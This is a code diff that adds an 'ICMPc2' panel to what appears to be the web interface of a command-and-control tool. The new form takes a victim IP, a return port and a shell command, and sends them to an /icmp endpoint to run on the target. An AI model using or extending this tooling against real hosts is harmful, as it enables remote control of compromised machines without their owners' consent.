@@ -17,6 +17,17 @@
         <p id="proc_label">Output:</p>
         <pre id="proc_output"></pre>
     </fieldset>
+    <fieldset>
+        <legend>ICMPc2 (ICMP)</legend>
+        <form action="/icmp" method="POST">
+            <p>Return port: <input type="text" name="return_port" id="icmp_return_port" required pattern="\d+" value="443"></p>
+            <p>Victim: <input type="text" name="vic_ip" id="icmp_vic_ip" required pattern="(\d{1,3}\.){3}\d{1,3}"></p>
+            <p>Command: <input type="text" name="command" id="icmp_command" required></p>
+            <input type="submit" value="Run!">
+        </form>
+        <p id="icmp_label">Output:</p>
+        <pre id="icmp_output"></pre>
+    </fieldset>
     <script>
         const form = document.forms[0]
         form.addEventListener("submit", function(e){
@@ -39,6 +50,30 @@
             }).then(res=>res.text()).then(data=>{
                 document.getElementById("proc_label").textContent = "Output:"
                 document.getElementById("proc_output").textContent = data;
+            });
+            return false;
+        });
+        const icmp_form = document.forms[1];
+        icmp_form.addEventListener("submit", function(e){
+            document.getElementById("icmp_label").textContent = "Output: Running..."
+            const return_port = icmp_form.elements.return_port.value;
+            const vic_ip = icmp_form.elements.vic_ip.value;
+            const command = icmp_form.elements.command.value;
+            e.preventDefault();
+            e.stopImmediatePropagation();
+            fetch("/icmp", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    return_port,
+                    vic_ip,
+                    command
+                })
+            }).then(res=>res.text()).then(data=>{
+                document.getElementById("icmp_label").textContent = "Output:"
+                document.getElementById("icmp_output").textContent = data;
             });
             return false;
         });
